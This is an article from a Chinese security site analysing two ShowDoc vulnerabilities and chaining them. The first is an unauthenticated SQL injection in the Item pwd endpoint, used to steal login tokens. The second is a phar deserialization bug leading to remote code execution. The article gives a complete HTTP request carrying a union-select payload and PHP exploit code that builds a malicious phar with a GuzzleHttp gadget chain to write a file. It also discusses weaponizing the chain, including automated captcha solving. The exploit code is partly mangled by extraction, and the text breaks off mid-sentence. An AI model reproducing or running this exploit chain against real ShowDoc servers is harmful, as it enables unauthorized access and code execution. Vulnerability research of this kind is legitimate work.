---
title: showdoc sqli to rce漏洞利用思考
url: https://www.4hou.com/posts/XPxA
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2024-07-02
fetch_date: 2025-10-06T17:41:56.017855
---

# showdoc sqli to rce漏洞利用思考

showdoc sqli to rce漏洞利用思考 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# showdoc sqli to rce漏洞利用思考

盛邦安全
[技术](https://www.4hou.com/category/technology)
2024-07-01 14:41:20

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)123093

收藏

导语：showdoc sqli to rce漏洞利用思考

**漏洞版本**

sqli <=3.2.5

phar 反序列化 <=3.2.4

**漏洞分析**

前台sqli

补丁

```
https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda
```

补丁对比发现，在server/Application/Api/Controller/ItemController.class.php中将$item\_id变量从拼接的方式换成参数绑定的形式，那么可以推断，这个点可能存在sql注入。

![QQ截图20240627161403.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553740130985.png "1719553135175536.png")

在server/Application/Api/Controller/ItemController.class.php的pwd方法中，从请求中拿到item\_id参数，并拼接到where条件中执行，并无鉴权，由此可判断为前台sql注入。

![QQ截图20240627163011.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553741120102.png "1719553152141188.png")

但在进入sql注入点之前，会从请求中获取captcha\_id和captcha参数，该参数需要传入验证码id及验证码进行验证，所以，每次触发注入之前，都需要提交一次验证码。

![QQ截图20240627163208.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553742109697.png "1719553168482998.png")

验证码的逻辑是根据captcha\_id从Captcha表中获取未超时的验证码进行比对，验证过后，会将验证码设置为过期状态。

![QQ截图20240627163238.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553743106826.png "1719553183142465.png")

完整拼接的sql语句

```
SELECT * FROM item WHERE ( item_id = '1' ) LIMIT 1
```

![QQ截图20240627163300.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553744212042.png "1719553207173858.png")

$password 和 $refer\_url 参数都可控，可通过联合查询控制password的值满足条件返回$refer\_url参数值，1') union select 1,2,3,4,5,6,7,8,9,0,11,12 --，6对应的是password字段，所以password参数传递6，条件成立，回显传入$refer\_url参数，那么就存在sql注入。

![QQ截图20240627163543.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553745173239.png "1719553222782159.png")

```
POST /server/index.php?s=/Api/Item/pwd HTTP/1.1Host: 172.20.10.1Content-Length: 110Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://127.0.0.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://127.0.0.1/server/index.php?s=/Api/Item/pwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"sec-fetch-site: same-originsec-fetch-mode: navigatesec-fetch-dest: documentcookie: PHPSESSID=1r419tk5dmut6vs4etuv656t1q; think_language=zh-CN; XDEBUG_SESSION=XDEBUG_ECLIPSEx-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: close
captcha=8856&captcha_id=87&item_id=1')+union+select+1,2,3,4,5,6,7,8,9,0,11,12+--&password=6&refer_url=aGVsbG8=
```

![QQ截图20240627163354.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553746167061.png "1719553270200424.png")

**sqli获取token**

鉴权是通过调用server/Application/Api/Controller/BaseController.class.php的checkLogin方法来进行验证。

![QQ截图20240627163427.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553747860788.png "1719553287172896.png")

未登录时，会从请求中拿到user\_token参数，再通过user\_token在UserToken表中查询，验证是否超时，将未超时记录的uid字段拿到User表中查询，最后将返回的$login\_user设置到Session中。

那么只需要通过注入获取到UserToken表中未超时的token，那么就可以通过该token访问后台接口。

**phar反序列化rce**

补丁

```
https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30
```

补丁将new\_is\_writeable方法的访问权限从public设置为private。

![QQ截图20240627163453.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553748165578.png "1719553325950780.png")

在server/Application/Home/Controller/IndexController.class.php的new\_is\_writeable方法中。该处调用了is\_dir，并且$file可控，熟悉phar反序列化的朋友都知道，is\_dir函数可协议可控的情况下可触发反序列化。

![QQ截图20240627163525.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553749207258.png "1719553339416556.png")

有了触发反序列化的点，还需要找到一条利用链，Thinkphp环境中用到GuzzleHttp，GuzzleHttp\Cookie\FileCookieJar的\_\_destruct方法可保存文件。

![QQ截图20240627163543.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553750649667.png "1719553358248761.png")

网上已经有很多分析，这里直接给出生成phar的exp。

```
cookies = array(new SetCookie());  }private $strictMode;}class FileCookieJar extends CookieJar  {    private $filename = "E:\\Tools\\Env\\phpstudy_pro\\WWW\\showdoc-3.2.4\\server\\test.php";    private $storeSessionCookies = true;  }class SetCookie  {    private $data = array('Expires' => ');  }}namespace {  $phar = new Phar("phar.phar"); //后缀名必须为phar  $phar->startBuffering();  $phar->setStub("GIF89a"."); //设置stub  $o = new \GuzzleHttp\Cookie\FileCookieJar();  $phar->setMetadata($o); //将⾃定义的meta-data存⼊manifest  $phar->addFromString("test.txt", "test"); //添加要压缩的⽂件  //签名⾃动计算  $phar->stopBuffering();
}
```

生成exp时，写入的路径需要指定绝对路径，在docker中部署的默认为/var/www/html，其他则可以通过访问时指定一个不存在的模块报错拿到绝对路径。

![QQ截图20240627163631.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553750970752.png "1719553397208916.png")

后续利用，找到一个上传且知道路径的点，将生成的phar文件改成png进行上传。

![QQ截图20240627163650.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553752168730.png "1719553409902169.png")

访问返回的链接，可获取上传文件的路径。

![QQ截图20240627163713.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553752871811.png "1719553425811928.png")

调用new\_is\_writeable方法，通过phar://访问文件触发反序列化。

![QQ截图20240627163731.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553753131679.png "1719553444120362.png")

**武器化利用思考**

在java环境下，对该漏洞进行武器化时，考虑到两点情况，一个是在通过sqli获取token时，需要对验证码进行识别，目前网上已经有师傅移植了ddddocr。

```
https://github.com/BreathofWild/ddddocr-java8
```

另一个是在使用exp生成phar文件时，需要指定写入文件的绝对路径以及内容，在java下没找到可以直接生成phar文件的方法，没法动态生成phar文件，对phar文档格式解析，实现一个可在java环境下指定反序列化数据来生成phar文件的方法。

**phar文档格式解析**

通过php生成一个phar文件，用010 Editor 打开，通过官网文档对phar格式说明，解析phar的文件。

```
https://www.php.net/manual/zh/phar.fileformat.ingredients.php
```

phar文档分为四个部分：Stub、manifest、contents、signature

**Stub**

就是一个php文件，用于标识该文件为phar文件，该文件内容必须以来结尾 ，感觉类似于文件头。

![QQ截图20240627163756.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553754128431.png "1719553458177874.png")

**manifest**

这个部分不同区间指定了一些信息，其中就包含了反序列化的数据。

```
https://www.php.net/manual/zh/phar.fileformat.phar.php
```

1-4（bytes） 存放的是整个 manifest 的长度，01C7转换为10进制为455,代表整个manifest 的长度455。

![QQ截图20240627163825.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240628/1719553755633098.png "171955350419897...